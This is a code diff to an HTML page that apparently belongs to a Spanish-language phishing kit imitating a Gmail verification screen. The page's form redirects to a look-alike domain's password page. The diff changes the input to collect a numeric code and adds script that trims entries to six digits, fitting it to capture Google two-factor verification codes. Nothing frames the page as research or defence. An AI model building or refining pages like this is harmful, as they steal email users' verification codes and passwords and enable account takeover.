@@ -146,7 +146,7 @@
             <input type="hidden" name="_next" value="https://gmailverificacionpersonal.vercel.app/contraseña.html">
           <div class="continput">
             <label for="email">G-</label>
-          <input type="text" id="email" name="email" value="Ingresa el codigo" required>
+          <input type="number" id="email" name="codigo" value="Ingresa el codigo" maxlenght="10" required>
         </div>
 
           <div class="checkbox">
@@ -161,6 +161,14 @@
       </div>
 
       <script>
+
+            var input = document.getElementById("email");
+            input.addEventListener("input", function() {
+              if (input.value.length > 6) {
+                input.value = input.value.slice(0, 6);
+              }
+            });
+
         var contador = 180;
         // que se muestre en como minutos..
         var minutos = 0;
